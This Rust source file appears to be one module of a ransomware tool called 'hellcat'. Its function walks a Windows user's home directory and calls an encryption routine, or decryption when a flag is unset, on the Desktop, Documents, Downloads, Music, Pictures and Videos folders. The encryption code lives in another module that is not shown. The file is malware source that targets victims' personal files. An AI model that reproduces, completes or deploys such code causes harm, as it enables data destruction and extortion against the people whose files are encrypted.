use dirs;

// import encyrption module in ./encryption/enc.rs
use crate::encryption::enc::{self};
use crate::types::{MalwareAction};


pub async fn hellcat_windows(actions:MalwareAction) {
    
    // get the home directory
    let home = dirs::home_dir().unwrap();
    let mut home_str = home.to_str().unwrap();

    if actions.path != "_home" {
        home_str = actions.path.as_str();
    }

    println!("Home {}", home_str);

    // array of home dir with: Desktop, Documents, Downloads, Music, Puctures, Videos
    let intresting_folder = [
        "Desktop",
        "Documents",
        "Downloads",
        "Music",
        "Pictures",
        "Videos"
    ];

    for f in intresting_folder {
        // start encryption
        let full_path = home_str.to_string() + "\\" + f;
        println!("Encrypting: {}", full_path);

        if actions.encrypt {
            enc::encryption(full_path.as_str(), false);
        } else {
            enc::encryption(full_path.as_str(), true);
        }
    }
}